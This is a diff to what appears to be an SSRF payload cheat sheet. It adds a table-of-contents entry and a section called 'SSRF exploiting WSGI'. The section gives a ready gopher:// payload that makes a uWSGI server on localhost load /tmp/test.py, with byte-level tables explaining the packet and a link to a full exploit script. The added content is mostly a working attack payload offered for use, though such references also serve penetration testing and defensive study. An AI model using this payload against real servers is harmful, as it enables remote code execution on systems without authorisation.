@@ -29,6 +29,7 @@
   * [ldap://](#ldap)
   * [gopher://](#gopher)
   * [netdoc://](#netdoc)
+* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -354,6 +355,28 @@ Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 ```powershell
 ssrf.php?url=gopher://127.0.0.1:4242/DATA
 ```
+
+## SSRF exploiting WSGI
+
+Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
+
+```powershell
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+```
+
+| Header    |           |             |
+|-----------|-----------|-------------|
+| modifier1 | (1 byte)  | 0 (%00)     |
+| datasize  | (2 bytes) | 26 (%1A%00) |
+| modifier2 | (1 byte)  | 0 (%00)     |
+
+| Variable (UWSGI_FILE) |           |    |            |   |
+|-----------------------|-----------|----|------------|---|
+| key length            | (2 bytes) | 10 | (%0A%00)   |   |
+| key data              | (m bytes) |    | UWSGI_FILE |   |
+| value length          | (2 bytes) | 12 | (%0C%00)   |   |
+| value data            | (n bytes) |    | /tmp/test.py   |   |
+	
 
 ## SSRF to XSS 
 
